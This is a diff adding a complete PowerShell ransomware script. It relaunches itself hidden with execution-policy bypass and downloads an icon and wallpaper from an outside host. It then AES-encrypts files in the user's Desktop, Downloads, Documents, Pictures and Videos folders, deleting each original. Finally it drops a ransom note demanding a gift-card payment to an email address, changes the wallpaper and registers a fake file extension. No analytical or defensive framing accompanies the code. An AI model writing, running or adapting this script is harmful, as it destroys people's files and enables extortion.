@@ -1,0 +1,128 @@
+$ErrorActionPreference = "SilentlyContinue"
+
+$IconUrl       = "http://website-test-123.netlify.app/John.ico"
+$WallpaperUrl  = "http://website-test-123.netlify.app/dox.jpg"
+$TempIcon      = "$env:TEMP\John.ico"
+$TempWallpaper = "$env:TEMP\dox.jpg"
+$FakeExt       = ".John"
+$NotePath      = "$env:PUBLIC\Desktop\HOW_TO_DECRYPT.txt"
+
+if ($host.Name -ne "ConsoleHost") {
+    powershell -WindowStyle Hidden -EP Bypass -Command $MyInvocation.MyCommand.Definition
+    exit
+}
+
+function Download-File {
+    param($Url, $Path)
+    try { (New-Object Net.WebClient).DownloadFile($Url, $Path); if (Test-Path $Path) { return $true } } catch {}
+    try { Invoke-WebRequest $Url -OutFile $Path -UseBasicParsing; if (Test-Path $Path) { return $true } } catch {}
+    try { Start-BitsTransfer -Source $Url -Destination $Path; if (Test-Path $Path) { return $true } } catch {}
+    return $false
+}
+
+if (-not (Download-File $IconUrl $TempIcon)) { exit }
+if (-not (Download-File $WallpaperUrl $TempWallpaper)) { exit }
+
+Add-Type -TypeDefinition @'
+using System;
+using System.Security.Cryptography;
+using System.IO;
+using System.Text;
+public class AES128CBC {
+    public static void EncryptFile(string inputFile, string outputFile, byte[] key, byte[] iv) {
+        using (Aes aes = Aes.Create()) {
+            aes.KeySize = 128;
+            aes.BlockSize = 128;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            aes.Key = key;
+            aes.IV = iv;
+
+            using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
+            using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
+            using (CryptoStream cs = new CryptoStream(fsOut, aes.CreateEncryptor(), CryptoStreamMode.Write)) {
+                fsIn.CopyTo(cs);
+            }
+        }
+        File.Delete(inputFile);
+    }
+}
+'@
+
+$Key = New-Object Byte[] 16
+$IV  = New-Object Byte[] 16
+$RNG = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+$RNG.GetBytes($Key)
+$RNG.GetBytes($IV)
+$RNG.Dispose()
+
+$NoteContent = @"
+!!! YOUR FILES ARE ENCRYPTED !!!
+
+To decrypt your files, you need:
+- This file
+- The decryption tool (contact us)
+
+Your personal ID:
+$([BitConverter]::ToString($Key) -replace '-','')
+
+IV: $([BitConverter]::ToString($IV) -replace '-','')
+
+Send 20$ Worth Of Gift Card  to: JohnHammond 
+
+After payment, send us:
+- This file
+- Transaction ID
+
+Email: johnhammond010@gmail.com
+"@
+Set-Content -Path $NotePath -Value $NoteContent -Encoding UTF8
+
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+'@
+
+[Wallpaper]::SystemParametersInfo(20, 0, $TempWallpaper, 3) | Out-Null
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value $TempWallpaper
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "WallpaperStyle" -Value "2"
+Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "TileWallpaper" -Value "0"
+
+$extKey   = "HKCU:\Software\Classes\$FakeExt"
+$classKey = "HKCU:\Software\Classes\JohnFile"
+
+New-Item -Path $extKey -Value "JohnFile" -Force | Out-Null
+New-Item -Path "$classKey\DefaultIcon" -Force | Out-Null
+Set-Item -Path "$classKey\DefaultIcon" -Value "$TempIcon,0"
+
+New-Item -Path "$classKey\shell\open\command" -Force | Out-Null
+Set-Item -Path "$classKey\shell\open\command" -Value "notepad.exe `"%1`""
+
+$folders = @(
+    "$env:USERPROFILE\Desktop",
+    "$env:USERPROFILE\Downloads",
+    "$env:USERPROFILE\Documents",
+    "$env:USERPROFILE\Pictures",
+    "$env:USERPROFILE\Videos"
+)
+
+foreach ($folder in $folders) {
+    if (Test-Path $folder) {
+        Get-ChildItem $folder -File -Recurse -ErrorAction SilentlyContinue | Where-Object {
+            $_.Extension -notin @(".john", ".ico", ".jpg", ".lnk", ".url", ".ini", ".sys", ".dll", ".exe", ".com", ".scr", ".bat", ".ps1", ".vbs")
+        } | ForEach-Object {
+            $encryptedPath = $_.FullName + $FakeExt
+            try {
+                [AES128CBC]::EncryptFile($_.FullName, $encryptedPath, $Key, $IV)
+            } catch {}
+        }
+    }
+}
+
+rundll32.exe user32.dll,UpdatePerUserSystemParameters
+rundll32.exe shell32.dll,SHChangeNotify,0x8000000,0,0,0
+
